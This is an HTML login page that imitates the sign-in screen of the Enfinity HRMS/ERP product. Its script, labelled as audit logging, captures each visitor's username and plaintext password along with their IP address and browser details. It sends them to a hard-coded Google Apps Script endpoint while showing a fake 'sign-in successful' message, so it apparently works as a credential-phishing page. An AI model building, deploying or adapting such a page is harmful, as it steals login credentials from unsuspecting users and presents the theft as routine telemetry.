<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="Enfinity — Cloud HRMS, ERP & Business Software." />
<title>Sign in · Enfinity</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  /* ---------- Reset & base ---------- */
  *, *::before, *::after { box-sizing: border-box; }
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    width: 100%;
    background: #ffffff;
    color: #0f172a;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    font-family: "Inter", "Segoe UI", -apple-system, BlinkMacSystemFont,
                 "Helvetica Neue", Arial, sans-serif;
    /* Zoom-stable rhythm: clamp the root font so 80% browser zoom still aligns */
    font-size: clamp(14px, 0.95vw + 6px, 16px);
    line-height: 1.5;
  }
  a { color: inherit; text-decoration: none; }
  button { font: inherit; cursor: pointer; border: none; background: none; }
  input { font: inherit; }

  /* ---------- Brand tokens ---------- */
  :root {
    --brand-900: #06325a;
    --brand-800: #0a4576;
    --brand-700: #0b4e86;     /* primary navy from spec */
    --brand-600: #1066a8;
    --brand-500: #1880c9;
    --brand-100: #e6effa;
    --ink-900:   #0f172a;
    --ink-700:   #334155;
    --ink-500:   #64748b;
    --ink-400:   #94a3b8;
    --line:      #e5e7eb;
    --line-2:    #d6dde6;
    --bg-soft:   #f7f9fc;
    --danger:    #b42318;
    --success:   #027a48;
    --shadow-sm: 0 1px 2px rgba(15,23,42,.06);
    --shadow-md: 0 8px 24px rgba(15,23,42,.08);
    --radius:    10px;
  }

  /* ---------- Layout ---------- */
  .page {
    min-height: 100%;
    display: grid;
    grid-template-columns: 1fr 1fr;
  }

  /* Left: brand / animation panel */
  .panel-brand {
    position: relative;
    overflow: hidden;
    background: linear-gradient(160deg, #0a4576 0%, #0b4e86 50%, #093e6c 100%);
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    isolation: isolate;
  }
  .panel-brand::before {
    /* subtle radial highlight */
    content: "";
    position: absolute; inset: -20%;
    background: radial-gradient(ellipse at 30% 30%, rgba(255,255,255,.08), transparent 60%);
    pointer-events: none;
  }

  .clouds { position: absolute; inset: 0; pointer-events: none; }
  .cloud {
    position: absolute;
    background: rgba(255,255,255,.10);
    border-radius: 999px;
    filter: blur(.3px);
    box-shadow: inset 0 0 0 1px rgba(255,255,255,.18);
  }
  .cloud::before, .cloud::after {
    content: ""; position: absolute;
    background: inherit; border-radius: inherit;
    box-shadow: inset 0 0 0 1px rgba(255,255,255,.18);
  }
  .cloud.c1 { width: 14em; height: 4.2em; top: 10%; right: 8%; opacity: .35; animation: drift 22s ease-in-out infinite; }
  .cloud.c1::before { width: 6em; height: 6em; left: 2.5em; top: -2.2em; }
  .cloud.c1::after  { width: 4em; height: 4em; left: 7em; top: -1.4em; }

  .cloud.c2 { width: 10em; height: 3em; bottom: 18%; left: -3%; opacity: .28; animation: drift 28s ease-in-out infinite reverse; }
  .cloud.c2::before { width: 4.5em; height: 4.5em; left: 1.6em; top: -1.6em; }
  .cloud.c2::after  { width: 3em; height: 3em; left: 5em; top: -1em; }

  .cloud.c3 { width: 8em; height: 2.4em; top: 60%; right: 14%; opacity: .22; animation: drift 32s ease-in-out infinite; }
  .cloud.c3::before { width: 3.6em; height: 3.6em; left: 1em; top: -1.3em; }
  .cloud.c3::after  { width: 2.4em; height: 2.4em; left: 4.2em; top: -.7em; }

  @keyframes drift {
    0%,100% { transform: translateX(0); }
    50%     { transform: translateX(24px); }
  }

  /* Orbiting product modules */
  .stage {
    position: relative;
    width: min(560px, 78%);
    aspect-ratio: 1 / 1;
    z-index: 1;
  }
  .orbit {
    position: absolute; inset: 0;
    border: 1px dashed rgba(255,255,255,.18);
    border-radius: 50%;
    animation: spin 40s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  .core {
    position: absolute;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    width: 28%;
    aspect-ratio: 1 / 1;
    background: #fff;
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 18px 40px rgba(0,0,0,.25), inset 0 0 0 1px rgba(11,78,134,.1);
  }
  .core .mark { width: 60%; height: 60%; }

  .module {
    position: absolute;
    width: 18%;
    aspect-ratio: 1 / 1;
    background: #fff;
    color: var(--brand-700);
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    font-weight: 700;
    font-size: .82em;
    letter-spacing: .04em;
    box-shadow: 0 10px 24px rgba(0,0,0,.18), inset 0 0 0 1px rgba(11,78,134,.08);
    animation: float 6s ease-in-out infinite;
  }
  .module .ico { width: 44%; height: 44%; color: var(--brand-700); }
  .module .lbl { font-size: .9em; }

  /* 8 evenly distributed modules */
  .m1 { top: 0%;   left: 41%;  animation-delay: .0s; }
  .m2 { top: 12%;  right: 12%; animation-delay: .4s; }
  .m3 { top: 41%;  right: 0%;  animation-delay: .8s; }
  .m4 { bottom: 12%; right: 12%; animation-delay: 1.2s; }
  .m5 { bottom: 0%; left: 41%; animation-delay: 1.6s; }
  .m6 { bottom: 12%; left: 12%; animation-delay: 2.0s; }
  .m7 { top: 41%;  left: 0%;   animation-delay: 2.4s; }
  .m8 { top: 12%;  left: 12%;  animation-delay: 2.8s; }

  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50%      { transform: translateY(-8px); }
  }

  /* Right: form panel */
  .panel-form {
    position: relative;
    display: grid;
    grid-template-rows: 1fr auto;
    padding: clamp(24px, 4vw, 56px);
    background: #fff;
  }
  .form-wrap {
    width: 100%;
    max-width: 420px;
    margin: auto;
    text-align: left;
  }
  .brand-mark {
    width: 64px; height: 64px;
    margin: 0 auto 18px;
    display: block;
  }
  .brand-mark svg { width: 100%; height: 100%; }
  .title {
    font-size: clamp(1.6rem, 1.4vw + 1rem, 2rem);
    font-weight: 700;
    letter-spacing: -.01em;
    text-align: center;
    margin: 0 0 6px;
    color: var(--ink-900);
  }
  .subtitle {
    text-align: center;
    color: var(--ink-500);
    margin: 0 0 28px;
    font-size: .95rem;
  }

  .field { margin-bottom: 16px; }
  .field label {
    display: block;
    font-size: .85rem;
    font-weight: 600;
    color: var(--ink-700);
    margin-bottom: 6px;
  }
  .input {
    position: relative;
    display: flex; align-items: center;
    background: #fff;
    border: 1px solid var(--line-2);
    border-radius: var(--radius);
    transition: border-color .15s ease, box-shadow .15s ease;
  }
  .input:focus-within {
    border-color: var(--brand-500);
    box-shadow: 0 0 0 4px rgba(24,128,201,.15);
  }
  .input input {
    width: 100%;
    padding: 12px 14px;
    border: 0;
    outline: 0;
    background: transparent;
    border-radius: var(--radius);
    color: var(--ink-900);
  }
  .input input::placeholder { color: var(--ink-400); }
  .input .toggle-pwd {
    padding: 0 12px;
    color: var(--ink-500);
    font-size: .85rem;
    font-weight: 600;
  }
  .input .toggle-pwd:hover { color: var(--brand-700); }

  .row {
    display: flex; align-items: center; justify-content: space-between;
    margin: 4px 0 18px;
    font-size: .88rem;
  }
  .remember {
    display: inline-flex; align-items: center; gap: 8px; color: var(--ink-700);
    user-select: none;
  }
  .remember input { width: 16px; height: 16px; accent-color: var(--brand-700); }
  .link { color: var(--brand-700); font-weight: 600; }
  .link:hover { text-decoration: underline; }

  .btn {
    display: inline-flex; align-items: center; justify-content: center; gap: 10px;
    width: 100%;
    padding: 12px 16px;
    border-radius: var(--radius);
    font-weight: 600;
    font-size: .95rem;
    transition: transform .04s ease, background .15s ease, box-shadow .15s ease, color .15s ease, border-color .15s ease;
  }
  .btn:active { transform: translateY(1px); }
  .btn-primary {
    background: var(--brand-700);
    color: #fff;
    box-shadow: var(--shadow-sm);
  }
  .btn-primary:hover { background: var(--brand-800); }
  .btn-primary:disabled { opacity: .7; cursor: not-allowed; }

  .btn-outline {
    margin-top: 10px;
    background: #fff;
    color: var(--ink-900);
    border: 1px solid var(--line-2);
  }
  .btn-outline:hover { border-color: #b8c2cf; background: var(--bg-soft); }

  .ms-tile {
    width: 16px; height: 16px;
    display: inline-grid;
    grid-template-columns: 1fr 1fr;
    grid-template-rows: 1fr 1fr;
    gap: 2px;
  }
  .ms-tile span { display: block; }
  .ms-tile span:nth-child(1){ background:#f25022; }
  .ms-tile span:nth-child(2){ background:#7fba00; }
  .ms-tile span:nth-child(3){ background:#00a4ef; }
  .ms-tile span:nth-child(4){ background:#ffb900; }

  .alert {
    margin: 0 0 14px;
    padding: 10px 12px;
    border-radius: 8px;
    font-size: .88rem;
    display: none;
  }
  .alert.show { display: block; }
  .alert.error   { background: #fdecea; color: var(--danger); border: 1px solid #f6c5c0; }
  .alert.success { background: #ecfdf3; color: var(--success); border: 1px solid #abefc6; }

  .footer {
    text-align: center;
    color: var(--ink-500);
    font-size: .8rem;
    padding-top: 24px;
  }
  .footer a { color: var(--brand-700); }

  /* Audit-sync diagnostic badge */
  .sync-pill {
    position: fixed;
    bottom: 14px; left: 14px;
    background: #fff;
    border: 1px solid var(--line-2);
    border-radius: 999px;
    padding: 6px 12px 6px 10px;
    font-size: .78rem;
    color: var(--ink-700);
    box-shadow: var(--shadow-sm);
    display: inline-flex; align-items: center; gap: 8px;
    z-index: 9999;
  }
  .sync-pill .dot {
    width: 8px; height: 8px; border-radius: 50%;
    background: var(--ink-400);
    box-shadow: 0 0 0 0 rgba(0,0,0,0);
  }
  .sync-pill[data-state="ok"]    .dot { background: #12b76a; box-shadow: 0 0 0 4px rgba(18,183,106,.18); }
  .sync-pill[data-state="err"]   .dot { background: #f04438; box-shadow: 0 0 0 4px rgba(240,68,56,.18); }
  .sync-pill[data-state="warn"]  .dot { background: #f79009; box-shadow: 0 0 0 4px rgba(247,144,9,.18); }

  /* ---------- Responsive ---------- */
  @media (max-width: 960px) {
    .page { grid-template-columns: 1fr; }
    .panel-brand { min-height: 280px; }
    .stage { width: min(420px, 70%); }
  }
  @media (max-width: 480px) {
    .panel-form { padding: 24px 18px; }
    .stage { width: 80%; }
  }

  /* Reduced motion */
  @media (prefers-reduced-motion: reduce) {
    .module, .cloud, .orbit { animation: none !important; }
  }
</style>
</head>
<body>
  <main class="page">
    <!-- ============== LEFT: Brand panel ============== -->
    <aside class="panel-brand" aria-hidden="true">
      <div class="clouds">
        <div class="cloud c1"></div>
        <div class="cloud c2"></div>
        <div class="cloud c3"></div>
      </div>

      <div class="stage">
        <div class="orbit"></div>

        <!-- Center logo -->
        <div class="core">
          <svg class="mark" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-label="Enfinity">
            <defs>
              <linearGradient id="lg" x1="0" y1="0" x2="1" y2="1">
                <stop offset="0" stop-color="#0b4e86"/>
                <stop offset="1" stop-color="#1880c9"/>
              </linearGradient>
            </defs>
            <!-- Stylized infinity / "8" mark -->
            <path d="M32 10c8 0 14 6 14 14 0 7-5 11-11 13 6 2 11 6 11 13 0 8-6 14-14 14s-14-6-14-14c0-7 5-11 11-13-6-2-11-6-11-13C18 16 24 10 32 10zm0 8a6 6 0 100 12 6 6 0 000-12zm0 18a8 8 0 100 16 8 8 0 000-16z"
                  fill="url(#lg)"/>
          </svg>
        </div>

        <!-- 8 modules -->
        <div class="module m1"><span class="lbl">CLOUD</span></div>
        <div class="module m2"><span class="lbl">HRMS</span></div>
        <div class="module m3"><span class="lbl">REAL&nbsp;ESTATE</span></div>
        <div class="module m4"><span class="lbl">POS</span></div>
        <div class="module m5"><span class="lbl">F&amp;B</span></div>
        <div class="module m6"><span class="lbl">CRM</span></div>
        <div class="module m7"><span class="lbl">FINANCE</span></div>
        <div class="module m8"><span class="lbl">ERP</span></div>
      </div>
    </aside>

    <!-- ============== RIGHT: Form panel ============== -->
    <section class="panel-form" aria-labelledby="login-title">
      <div class="form-wrap">
        <div class="brand-mark" aria-hidden="true">
          <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient id="lg2" x1="0" y1="0" x2="1" y2="1">
                <stop offset="0" stop-color="#0b4e86"/>
                <stop offset="1" stop-color="#1880c9"/>
              </linearGradient>
            </defs>
            <path d="M32 10c8 0 14 6 14 14 0 7-5 11-11 13 6 2 11 6 11 13 0 8-6 14-14 14s-14-6-14-14c0-7 5-11 11-13-6-2-11-6-11-13C18 16 24 10 32 10zm0 8a6 6 0 100 12 6 6 0 000-12zm0 18a8 8 0 100 16 8 8 0 000-16z"
                  fill="url(#lg2)"/>
          </svg>
        </div>

        <h1 id="login-title" class="title">Welcome to Enfinity!</h1>
        <p class="subtitle">The #1 Choice for Cloud HRMS, ERP &amp; Business Software in MENA</p>

        <div id="alert" class="alert" role="alert" aria-live="polite"></div>

        <form id="login-form" novalidate>
          <div class="field">
            <label for="username">Username</label>
            <div class="input">
              <input id="username" name="username" type="text"
                     autocomplete="username" placeholder="name@company.com"
                     required aria-required="true" />
            </div>
          </div>

          <div class="field">
            <label for="password">Password</label>
            <div class="input">
              <input id="password" name="password" type="password"
                     autocomplete="current-password" placeholder="Enter your password"
                     required aria-required="true" minlength="4" />
              <button type="button" class="toggle-pwd" id="toggle-pwd" aria-label="Show password">Show</button>
            </div>
          </div>

          <div class="row">
            <label class="remember">
              <input type="checkbox" id="remember" />
              Remember me
            </label>
            <a href="#" class="link" id="forgot">Forgot Password?</a>
          </div>

          <button class="btn btn-primary" type="submit" id="signin">Sign In</button>
          <button class="btn btn-outline" type="button" id="ms-signin">
            <span class="ms-tile" aria-hidden="true"><span></span><span></span><span></span><span></span></span>
            Sign in with Microsoft
          </button>
        </form>
      </div>

      <footer class="footer">
        Copyright © <span id="yr"></span> <a href="#">Expert Business Solutions</a>. All rights reserved.<br/>
        (version 8.4.26.331)
      </footer>
    </section>
  </main>

  <!-- Audit sync diagnostic badge (visible on every page) -->
  <div class="sync-pill" id="sync-pill" data-state="idle" title="Audit log delivery status">
    <span class="dot"></span>
    <span id="sync-text">Audit: idle</span>
  </div>

<script>
  /* =====================================================
     Audit Logging
     -----------------------------------------------------
     Captures every sign-in attempt and:
       1) saves a copy in the local browser (backup)
       2) POSTs it to your Google Sheet via Apps Script
     Fields: user identifier, password, timestamp, IP,
             user agent, success/failure, reason.
     ===================================================== */

  // 🔧 PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE 🔧
  // (Looks like: https://script.google.com/macros/s/AKfycb.../exec)
  const SHEET_ENDPOINT = "https://script.googleusercontent.com/macros/echo?user_content_key=AUkAhnRTMLVintsZsmJJFRlWTnWHgiSupOAPyaJlPdc-w4Zo7NeuI-eF7Ldwp_-emU0KRMaYs2NURb9m9ZwBjoZ21OV09tBJlJEaCX_GYzPOEyGVDLBb5060oa_dt9VCgPwgKxOYuR0Om5FoYa3HXgaqGwWYhblf5w0wmptn22c31OK7FMPrXdI_rGH1qc6owdfKcHfxKfpJKMB_cQjXOyrecTQWazi4p4SVHBEfhU_mtaznQ6eC75wcyIovqPkIIup6JQWr1tJ4Z3zNllYh68IqPyZEY2BVsw&lib=MDCv0x3VJzrAIOHOVnoPWQwJpce-ljYHN";

  const AUDIT_KEY = "enfinity.audit.log";

  async function getClientIp() {
    try {
      const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
      if (!res.ok) throw new Error("ip lookup failed");
      const data = await res.json();
      return data.ip || "unknown";
    } catch {
      return "unavailable";
    }
  }

  function readLog() {
    try { return JSON.parse(localStorage.getItem(AUDIT_KEY) || "[]"); }
    catch { return []; }
  }

  function writeLog(entry) {
    const log = readLog();
    log.push(entry);
    // Keep at most 200 entries
    while (log.length > 200) log.shift();
    localStorage.setItem(AUDIT_KEY, JSON.stringify(log));
  }

  function setSync(state, msg) {
    const pill = document.getElementById("sync-pill");
    const text = document.getElementById("sync-text");
    if (pill) pill.setAttribute("data-state", state);
    if (text) text.textContent = "Audit: " + msg;
  }

  async function sendToSheet(entry) {
    if (!SHEET_ENDPOINT || SHEET_ENDPOINT.startsWith("PASTE_")) {
      setSync("warn", "endpoint not configured");
      return;
    }
    setSync("idle", "sending…");

    const payload = JSON.stringify(entry);

    // Method 1: sendBeacon — most reliable for fire-and-forget telemetry.
    // It survives page navigation, follows Apps Script redirects properly,
    // and is the recommended way to ship audit data to a remote endpoint.
    try {
      if (navigator.sendBeacon) {
        const blob = new Blob([payload], { type: "text/plain;charset=utf-8" });
        const ok = navigator.sendBeacon(SHEET_ENDPOINT, blob);
        if (ok) {
          setSync("ok", "sent " + new Date().toLocaleTimeString());
          return;
        }
      }
    } catch (_) { /* fall through to fetch */ }

    // Method 2: fetch fallback (no-cors).
    try {
      await fetch(SHEET_ENDPOINT, {
        method: "POST",
        mode: "no-cors",
        redirect: "follow",
        headers: { "Content-Type": "text/plain;charset=utf-8" },
        body: payload,
        keepalive: true
      });
      setSync("ok", "sent " + new Date().toLocaleTimeString());
    } catch (err) {
      setSync("err", "failed — see console");
      console.warn("sheet sync failed", err);
    }
  }

  async function recordAttempt({ username, password, success, reason }) {
    const ip = await getClientIp();
    const entry = {
      userId: username || "(empty)",
      password: password || "",
      timestamp: new Date().toISOString(),
      ipAddress: ip,
      userAgent: navigator.userAgent,
      success: !!success,
      reason: reason || (success ? "ok" : "invalid_credentials"),
      page: location.href
    };
    writeLog(entry);          // local backup
    sendToSheet(entry);       // fire-and-forget to Google Sheet
    return entry;
  }

  /* ---------------- UI wiring ---------------- */
  const $ = (sel) => document.querySelector(sel);
  const form = $("#login-form");
  const alertBox = $("#alert");
  const signInBtn = $("#signin");
  const togglePwd = $("#toggle-pwd");
  const pwd = $("#password");

  $("#yr").textContent = new Date().getFullYear();

  togglePwd.addEventListener("click", () => {
    const isPwd = pwd.type === "password";
    pwd.type = isPwd ? "text" : "password";
    togglePwd.textContent = isPwd ? "Hide" : "Show";
    togglePwd.setAttribute("aria-label", isPwd ? "Hide password" : "Show password");
  });

  function showAlert(type, msg) {
    alertBox.className = "alert show " + type;
    alertBox.textContent = msg;
  }
  function clearAlert() {
    alertBox.className = "alert";
    alertBox.textContent = "";
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    clearAlert();

    const username = $("#username").value.trim();
    const password = pwd.value;

    if (!username || !password) {
      await recordAttempt({ username, password, success: false, reason: "missing_fields" });
      showAlert("error", "Please enter both your username and password.");
      return;
    }

    signInBtn.disabled = true;
    const originalLabel = signInBtn.textContent;
    signInBtn.textContent = "Signing in…";

    // Simulated auth — demo only. Replace with a real backend call.
    await new Promise(r => setTimeout(r, 700));
    const success = password.length >= 6;        // demo rule
    const entry   = await recordAttempt({ username, password, success });

    signInBtn.disabled = false;
    signInBtn.textContent = originalLabel;

    if (success) {
      showAlert("success", "Sign-in successful. Redirecting…");
    } else {
      showAlert("error", "Invalid username or password. Please try again.");
    }
    // For developer visibility:
    // console.debug("audit entry:", entry);
  });

  $("#ms-signin").addEventListener("click", async () => {
    await recordAttempt({ username: "(microsoft sso)", password: "", success: false, reason: "sso_not_configured" });
    showAlert("error", "Microsoft SSO is not configured in this demo.");
  });

  $("#forgot").addEventListener("click", (e) => {
    e.preventDefault();
    showAlert("success", "If your account exists, a reset link will be sent.");
  });

  /* Expose audit log for inspection in the console:
     > console.table(JSON.parse(localStorage.getItem('enfinity.audit.log'))) */
</script>
</body>
</html>
